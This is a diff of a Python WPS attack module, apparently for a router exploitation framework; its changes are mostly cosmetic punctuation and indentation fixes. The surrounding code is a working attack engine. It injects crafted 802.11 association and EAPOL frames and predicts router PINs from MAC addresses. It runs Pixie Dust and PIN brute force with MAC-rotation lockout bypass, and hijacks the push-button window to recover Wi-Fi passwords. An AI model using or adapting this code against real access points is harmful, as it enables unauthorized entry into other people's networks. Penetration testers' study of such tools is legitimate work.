@@ -12,13 +12,13 @@ Supported attack modes:
   scan          WPS-enabled AP discovery via wash (accepted dependency)
 
 Key algorithms implemented:
-  - DH 1536-bit key exchange (RFC 3526 Group 5)
-  - HMAC-SHA256 for AuthKey, PSK1, PSK2 derivation
-  - WPS PIN Luhn checksum (IEEE 802.11-2020 Annex J)
-  - Zhao statistical PIN generation
-  - OUI-based manufacturer default PIN database
-  - WPS lock detection and adaptive backoff
-  - Full EAP-WSC M1-M8 state machine with Scapy frame injection
+ - DH 1536-bit key exchange (RFC 3526 Group 5)
+ - HMAC-SHA256 for AuthKey, PSK1, PSK2 derivation
+ - WPS PIN Luhn checksum (IEEE 802.11-2020 Annex J)
+ - Zhao statistical PIN generation
+ - OUI-based manufacturer default PIN database
+ - WPS lock detection and adaptive backoff
+ - Full EAP-WSC M1-M8 state machine with Scapy frame injection
 
 Association flow (required before EAP exchange):
   The engine sends 802.11 Auth -> AssocReq (with WPS IE) -> EAPOL-Start before
@@ -31,8 +31,8 @@ capture fails, try adjacent channels (ch4, ch2). Use `iw dev <iface> scan`
 to confirm the actual operating frequency of the AP.
 
 Dependencies (accepted external):
-  - scapy: raw 802.11 frame injection and capture
-  - wash: WPS scanner (part of reaver-suite, accepted exception)
+ - scapy: raw 802.11 frame injection and capture
+ - wash: WPS scanner (part of reaver-suite, accepted exception)
 
 OS requirement: Linux only (raw sockets, nl80211, monitor mode).
 
@@ -802,7 +802,7 @@ class WscSession:
             sendp(auth_pkt, iface=iface, verbose=False, count=3, inter=0.05)
             time.sleep(0.3)
 
-            # 2. AssocReq — WPS-mode frame (NO RSN IE, correct WPS IE)
+            # 2. AssocReq - WPS-mode frame (NO RSN IE, correct WPS IE)
             # Critical: RSN IE in AssocReq causes AP to treat enrollee as WPA2 client
             # and reject with Deauth. WPS enrollment uses open auth at 802.11 layer.
             # WPS 2.0 IE: type=dd, len=9, OUI=00:50:f2:04, Version2 TLV=104a0001 10
@@ -811,7 +811,7 @@ class WscSession:
                 0x00, 0x50, 0xf2, 0x04,             # WFA OUI + WPS type
                 0x10, 0x4a, 0x00, 0x01, 0x10,       # Version TLV (Version2 = 0x20 → WPS 2.0)
             ])
-            # ExtendedCap IE (bit 2 = BSS Transition, bit 19 = BSS-Coex) — helps with some APs
+            # ExtendedCap IE (bit 2 = BSS Transition, bit 19 = BSS-Coex) - helps with some APs
             ext_cap = bytes([0x7f, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00])
             assoc_pkt = (
                 RadioTap()
@@ -832,13 +832,13 @@ class WscSession:
             sendp(assoc_pkt, iface=iface, verbose=False, count=3, inter=0.05)
             time.sleep(0.4)
 
-            # 3. EAPOL-Start — data frame ToDS=1 to trigger AP EAP exchange
+            # 3. EAPOL-Start - data frame ToDS=1 to trigger AP EAP exchange
             #    The AP responds with EAP-Request/Identity which starts WSC.
             eapol_start = (
                 RadioTap()
                 / Dot11(
                     type=2, subtype=0,
-                    FCfield=0x01,       # ToDS=1, FromDS=0 — STA → AP
+                    FCfield=0x01,       # ToDS=1, FromDS=0 - STA → AP
                     addr1=bssid,        # Receiver = AP
                     addr2=own_mac,      # Transmitter = STA
                     addr3=bssid,        # BSSID
@@ -1283,17 +1283,17 @@ def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
     """Generate predicted WPS PINs from the AP BSSID using vendor algorithms.
 
     Research sources:
-    - CVE-2026-36612 (Mercusys AC12G): PIN = (mac[3:6]) % 10^7 + checksum
-    - NetRise 2025 report: 80%+ devices still use MAC-derived PINs
-    - hackersmanifest.com/wireless-pentesting/11-wps/: D-Link/Ralink/ZTE/Arcadyan
-    - github.com/koolkdave/autoreaver: D-Link algorithm
+ - CVE-2026-36612 (Mercusys AC12G): PIN = (mac[3:6]) % 10^7 + checksum
+ - NetRise 2025 report: 80%+ devices still use MAC-derived PINs
+ - hackersmanifest.com/wireless-pentesting/11-wps/: D-Link/Ralink/ZTE/Arcadyan
+ - github.com/koolkdave/autoreaver: D-Link algorithm
 
     Known implementations:
-    - Ralink/MediaTek (TP-Link, Mercusys, D-Link, Tenda):
+ - Ralink/MediaTek (TP-Link, Mercusys, D-Link, Tenda):
         (mac[3]<<16 | mac[4]<<8 | mac[5]) % 10^7 + checksum
-    - ZTE/Huawei: NIC last 3 bytes as int % 10^7
-    - Arcadyan/Thomson: rotated NIC bytes
-    - Static defaults: per OUI (Zyxel, Linksys, Belkin, ASUS, D-Link)
+ - ZTE/Huawei: NIC last 3 bytes as int % 10^7
+ - Arcadyan/Thomson: rotated NIC bytes
+ - Static defaults: per OUI (Zyxel, Linksys, Belkin, ASUS, D-Link)
 
     Args:
         bssid: Target AP BSSID string.
@@ -1312,7 +1312,7 @@ def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
 
     pins: list[str] = []
 
-    # Algorithm 1: Ralink/MediaTek/TP-Link/Mercusys — CVE-2026-36612 variant
+    # Algorithm 1: Ralink/MediaTek/TP-Link/Mercusys - CVE-2026-36612 variant
     #   PIN7 = (mac[3] << 16 | mac[4] << 8 | mac[5]) % 10000000
     nic_a = (mac_bytes[3] << 16) | (mac_bytes[4] << 8) | mac_bytes[5]
     pins.append(_wps_pin_checksum(nic_a % 10_000_000))
@@ -1321,11 +1321,11 @@ def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
     nic_b = (mac_bytes[5] << 16) | (mac_bytes[4] << 8) | mac_bytes[3]
     pins.append(_wps_pin_checksum(nic_b % 10_000_000))
 
-    # Algorithm 3: ZTE / Huawei — direct last 3 bytes as decimal
+    # Algorithm 3: ZTE / Huawei - direct last 3 bytes as decimal
     nic_c = int(mac[6:], 16)
     pins.append(_wps_pin_checksum(nic_c % 10_000_000))
 
-    # Algorithm 4: Arcadyan / Thomson — compact NIC rotation
+    # Algorithm 4: Arcadyan / Thomson - compact NIC rotation
     nic_d = int(mac[6:8], 16) * 10_000 + int(mac[8:10], 16) * 100 + int(mac[10:12], 16)
     pins.append(_wps_pin_checksum(nic_d % 10_000_000))
 
@@ -1333,7 +1333,7 @@ def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
     nic_e = int(mac[6:12], 16)
     pins.append(_wps_pin_checksum(nic_e % 10_000_000))
 
-    # Algorithm 6: OUI-specific static/common PINs (prepended — try first)
+    # Algorithm 6: OUI-specific static/common PINs (prepended - try first)
     oui = mac[:6].upper()
     _OUI_STATIC: dict = {
         "001217": "12345670",  # Zyxel VMG series
@@ -1419,7 +1419,7 @@ def _build_ordered_pin_iterator(bssid: str) -> Iterator[str]:
                 seen.add(p)
                 yield p
 
-    # 1. BSSID-derived predicted PINs (vendor algorithms) — try first
+    # 1. BSSID-derived predicted PINs (vendor algorithms) - try first
     yield from _unique(predict_wps_pin_from_bssid(bssid))
     # 2. NULL / well-known weak PINs
     yield from _unique(generate_null_pin())
@@ -1604,7 +1604,7 @@ class Exploit(Exploit):
     __info__ = {
         "name": "WPS Native Engine v2",
         "description": (
-            "Native WPS attack engine v2 — incorporates latest research (2025/2026):\n"
+            "Native WPS attack engine v2 - incorporates latest research (2025/2026):\n"
             "  pixie_dust    Offline PIN via weak nonce (CVE-2014-9527, 80%+ still vulnerable)\n"
             "  pin_predict   BSSID-derived PIN algorithms (Ralink/MediaTek/D-Link/ZTE/Arcadyan)\n"
             "  pin_brute     Full 11k sweep + MAC rotation lockout bypass (CVE-2026-36612)\n"
@@ -1613,14 +1613,14 @@ class Exploit(Exploit):
             "  lockout_bypass Same as pin_brute with MAC rotation emphasis\n"
             "\n"
             "v2 fixes & improvements:\n"
-            "  - AssocReq: removed RSN IE (was causing AP Deauth rejection)\n"
-            "  - EAPOL-Start: fixed FCfield=ToDS=1 and frame type\n"
-            "  - Static PKE (priv=1, PKR=2) = 10x faster DH computation\n"
-            "  - PIN prediction: 6 vendor algorithms + OUI database\n"
-            "  - Lockout bypass: MAC rotation resets 60s timer (CVE-2026-36612)\n"
-            "  - PBC hijack: passive detection + instant enrollment\n"
+            " - AssocReq: removed RSN IE (was causing AP Deauth rejection)\n"
+            " - EAPOL-Start: fixed FCfield=ToDS=1 and frame type\n"
+            " - Static PKE (priv=1, PKR=2) = 10x faster DH computation\n"
+            " - PIN prediction: 6 vendor algorithms + OUI database\n"
+            " - Lockout bypass: MAC rotation resets 60s timer (CVE-2026-36612)\n"
+            " - PBC hijack: passive detection + instant enrollment\n"
             "\n"
-            "Research: NetRise 2025 — 80%+ devices still vulnerable to Pixie Dust,\n"
+            "Research: NetRise 2025 - 80%+ devices still vulnerable to Pixie Dust,\n"
             "firmware releases as recent as July 2025 still ship vulnerable code."
         ),
         "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
@@ -1648,7 +1648,7 @@ class Exploit(Exploit):
     delay          = OptFloat(1.0,        "Delay between PIN attempts in seconds")
     verbose        = OptBool(False,       "Enable verbose protocol output")
     output_dir     = OptString(".log",    "Directory to save results and logs")
-    static_pke     = OptBool(True,        "Use static PKE (priv=1, PKR=2) — speeds up 10x")
+    static_pke     = OptBool(True,        "Use static PKE (priv=1, PKR=2) - speeds up 10x")
     lockout_bypass = OptBool(True,        "Rotate MAC on lockout detection (CVE-2026-36612)")
     lockout_wait_s = OptInteger(65,       "Seconds to wait after lockout if MAC rotation unavailable")
     i_know_scope   = OptBool(False,       "Confirm you are authorized to test this target")
@@ -1814,7 +1814,7 @@ class Exploit(Exploit):
 
         This attack is entirely passive until the PBC window is detected.
         """
-        print_status(f"WPS PBC Hijack — monitoring {bssid} for PBC activation (Ctrl+C to stop)")
+        print_status(f"WPS PBC Hijack - monitoring {bssid} for PBC activation (Ctrl+C to stop)")
         print_info("  Waiting for user to press WPS button on the router...")
         print_info("  When 'Selected Registrar = true' detected, attack begins automatically.")
 
@@ -1874,10 +1874,10 @@ class Exploit(Exploit):
             print_info("Tip: Press the WPS button on the router, then re-run this module.")
             return
 
-        # PBC window open — attempt enrollment with PBC PIN (00000000)
+        # PBC window open - attempt enrollment with PBC PIN (00000000)
         elapsed = time.time() - detection_time[0]
         remaining = max(5, 120 - elapsed)
-        print_info(f"  PBC window: ~{remaining:.0f}s remaining — attempting enrollment now")
+        print_info(f"  PBC window: ~{remaining:.0f}s remaining - attempting enrollment now")
         timeout = min(remaining, 30)
         session = WscSession(bssid=bssid, iface=iface, timeout=timeout,
                              verbose=bool(self.verbose))
@@ -1887,7 +1887,7 @@ class Exploit(Exploit):
             print_success(f"PBC ENROLLMENT SUCCEEDED! PSK={psk}")
             self._save_result("pbc_hijack", f"PSK={psk}")
         else:
-            print_warning("PBC enrollment attempt failed — window may have closed.")
+            print_warning("PBC enrollment attempt failed - window may have closed.")
 
     def _run_pixie_dust(self, bssid: str, iface: str) -> None:
         """Execute Pixie Dust offline PIN recovery.
@@ -1902,7 +1902,7 @@ class Exploit(Exploit):
 
         if bool(self.static_pke):
             print_status(f"Pixie Dust + Static PKE (priv=1, PKR=2) against {bssid}")
-            print_info("Static PKE reduces AP DH computation — equivalent to reaver --dh-small")
+            print_info("Static PKE reduces AP DH computation - equivalent to reaver --dh-small")
         else:
             print_status(f"Pixie Dust against {bssid} on {iface}")
         print_info("Initiating EAP-WSC exchange (M1 -> M2 -> M3) to capture nonces ...")
@@ -1918,7 +1918,7 @@ class Exploit(Exploit):
         capture = session.capture_m2_for_pixie_dust(probe_pin)
         if capture is None:
             print_error("Failed to capture M2 from AP. Check monitor mode and channel.")
-            print_info("Tip: Fix applied in v2 — AssocReq now omits RSN IE and uses ToDS=1.")
+            print_info("Tip: Fix applied in v2 - AssocReq now omits RSN IE and uses ToDS=1.")
             print_info("     If still failing, try: sudo iw dev <iface> set channel <ch>")
             return
 
@@ -1977,10 +1977,10 @@ class Exploit(Exploit):
         """Brute-force WPS PIN with MAC rotation lockout bypass.
 
         New in v2:
-        - BSSID-derived predicted PINs tried first (~40-60% success on Ralink)
-        - MAC rotation on lockout (CVE-2026-36612 bypass: resets 60s counter)
-        - Configurable lockout_wait_s for APs with longer lockouts
-        - Reports predicted PINs separately from statistical sweep
+ - BSSID-derived predicted PINs tried first (~40-60% success on Ralink)
+ - MAC rotation on lockout (CVE-2026-36612 bypass: resets 60s counter)
+ - Configurable lockout_wait_s for APs with longer lockouts
+ - Reports predicted PINs separately from statistical sweep
         """
         max_tries    = int(self.max_tries) if int(self.max_tries) > 0 else 11000
         delay        = float(self.delay) if float(self.delay) > 0 else 1.0
